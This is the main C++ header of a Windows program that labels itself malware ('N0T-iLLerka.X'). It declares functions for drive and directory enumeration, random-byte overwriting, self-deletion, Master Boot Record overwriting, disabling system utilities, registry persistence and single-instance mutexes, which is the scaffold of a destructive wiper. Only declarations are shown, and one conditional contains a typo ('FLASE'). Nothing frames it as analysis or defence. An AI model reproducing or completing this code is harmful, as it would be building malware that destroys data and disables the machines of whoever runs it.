//// N0T-iLLerka.h : N0T-iLLerka.X's main Header File ////
#pragma once

// Compiler/Linker //
#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// Interenal Dependencies //
#include "Sub-Headers/settings.h"
#include "Sub-Headers/nt.h"
#include "Sub-Headers/resource.h"

// Libraries //
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

// FileSystem Macros //
#define nDRIVES 0x1a * 0x4
#define nMBR_SIZE 0x200

// Registry Macros //
#define szREGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
#define HKLM 0x1
#define HKCU 0x2

// Synchronization Macros //
#define szHOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv:/host.Proc(running)"
#define szHOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv:/host.Proc(running)"
#define nSEMAPHORE 2

// Utilitie Macros //
#define szMALWR_NAME L"N0T-iLLerka.X [.niX]"
#define szFORMAT L"%s failed with Errorcode:\n%d : %s\nDetails:\n"
#define nFORMAT_LEN lstrlen(szFORMAT)
#define nMAX_HEAP_SIZE 0xfa0

#define nMIN_RS_LEN 0x8
#define nMAX_RS_LEN 0x10
#define nMAX_BUFFER_SIZE 0x2000000

// Wrapper Macros //
#define nRNG_RAN(nMin, nMax) (nMin + (fnCryptGenRandomNumber() % ((nMax - nMin) + 1)))
#if DEBUG_MSG == 1
#define fnERRORHANDLERW fnErrorHandlerW
// #define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...) fnErrorHandlerW(lpText, lpCaption, lpFunction, uType, __VA_ARGS__)
#else
#define fnERRORHANDLERW
// #define fnERRORHANDLERW(lpText, lpCaption, lpFunction, uType, ...)
#endif

// Arrays/Sizes //
extern const WCHAR szCharSet[];
extern const size_t cnCharSet;

// FileSystem Functions //
BOOL fnCopyFileW(
	_In_ LPCWSTR lpAdpn,
	_In_ LPCWSTR lpAdfn,
	_In_ WCHAR szMfn[]
);
BOOL fnDriveEnumeratorW(
	_Out_ std::vector<std::wstring>* vszDrive
);
BOOL fnDirectoryIteratorW(
	_In_ std::wstring szDir,
	_In_ std::wstring szMask,
	_Out_ std::vector<std::wstring>* vszDir,
	_Out_ std::vector<std::wstring>* vszFile
);
BOOL fnSelfDeleteW(
	_In_ WCHAR szCd[],
	_In_ WCHAR szMfn[]
);
#if KILL_MBR == TRUE
BOOL fnOverwriteMBR(VOID);
#endif // KILL_MBR

// Registry Functions //
BOOL fnCreateRegistryKeyW(
	_In_ HKEY hKeyHK,
	_In_ LPCWSTR lpSubKey,
	_In_ BOOL wow32,
	_In_opt_ LPCWSTR lpValueName,
	_In_opt_ DWORD dwType,
	_In_opt_ DWORD dwValue
);
BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey
);
#if DISABLE_PROTECTIONS == FALSE
BOOL fnDisableUtilities(VOID);
#endif // !DISABLE_PROTECTIONS

// Synchronization Functions //
#if DISABLE_SYNCHRONIZATION == FLASE
BOOL fnCheckMutexW(
	_In_ LPCWSTR lpName
);
HANDLE fnCheckSemaphoreW(
	_In_ LPCWSTR lpName
);
#endif // !DISABLE_SYNCHRONIZATION

// Utilitie Functions //
INT fnCryptGenRandomNumber(VOID);
std::wstring fnCryptGenRandomStringW(
	_In_ INT nLen
);
VOID fnCryptGenRandomBufferW(
	_Inout_ LPBYTE pszRd,
	_In_ ULONG ulFs
);
LPVOID fnLoadResourceW(
	_In_ WORD resID,
	_Out_ LPDWORD dwBufferSize
);
BOOL fnSaveResourceW(
	_In_ LPCWSTR lpName,
	_In_ LPVOID lpBuffer,
	_In_ DWORD dwBufferSize
);
BOOL fnIsUserAdmin(VOID);
#if DEBUG_MSG == TRUE
VOID fnErrorHandlerW(
	_In_opt_ LPCWSTR lpText,
	_In_opt_ LPCWSTR lpCaption,
	_In_opt_ LPCWSTR lpFunction,
	_In_ UINT uType,
	_In_opt_ ...
);
#endif // DEBUG_MSG